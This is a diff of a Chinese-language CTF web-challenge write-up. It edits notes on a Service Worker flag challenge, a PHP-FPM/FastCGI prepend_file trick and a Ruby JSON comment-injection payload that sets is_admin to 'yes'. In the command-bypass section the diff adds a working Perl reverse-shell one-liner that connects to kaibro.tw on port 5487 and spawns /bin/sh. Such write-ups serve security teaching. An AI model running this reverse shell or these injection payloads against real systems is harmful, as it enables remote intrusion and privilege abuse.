@@ -23,7 +23,7 @@
 - 訪問`/`時會安裝 Service Worker
 - 然後把`/flag` cache成別的頁面
 - 把 Service Worker 取消或是關掉js就可
-- 或是在第一次安裝時，它其實會去 fetch `/flag` 內容，你只要這時候抓這個 response 就行
+- 或是在第一次安裝時，它其實會去 fetch `/flag` 內容，你只要這時候抓 response 就行
     - 瀏覽器 / BurpSuite 是你的好朋友
 
 ### 3v4l
@@ -94,8 +94,8 @@
         - 如果要在單個 Request 內就執行`prepend_file`的話，要加`SCRIPT_FILENAME`
         - 多個 Request 的話，可以拔掉`SCRIPT_FILENAME`，先把設定寫進去
             - 譴責這種解法
-            - 需要一直狂送 Payload
-            - 會把全部 fpm process 設定寫掉，影響別人解題
+            - 在大部分狀況下，需要一直狂送 Payload 或是狂 Refresh
+            - 很容易把全部 fpm process 設定寫掉，影響別人解題
     - 買個短一點的 domain (X
         - 看看某海狗長度5的 domain (貧窮限制了我的想像力)
     - 剩下就慢慢看 FastCGI 結構去優化
@@ -129,7 +129,7 @@
 - 目標是把 parse 完的`is_admin`蓋成`yes`
 
 - 解法一 (預期解)
-    - Ruby json 可以用註解
+    - Ruby JSON 可以用註解
     - name: `","is_admin":"yes",/*`
     - age: `*/"@":"@`
     - 合起來: `{"name":"","is_admin":"yes",/*","is_admin":"no", "age":"*/"@":"@"}`
@@ -160,7 +160,9 @@
     - `$BASH`
 - 解法四
     - ``` a=`pr -T`;$a ```
-
+- 解法五
+    - `perl`
+    - `use Socket;$i="kaibro.tw";$p=5487;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};`
 
 ----
 
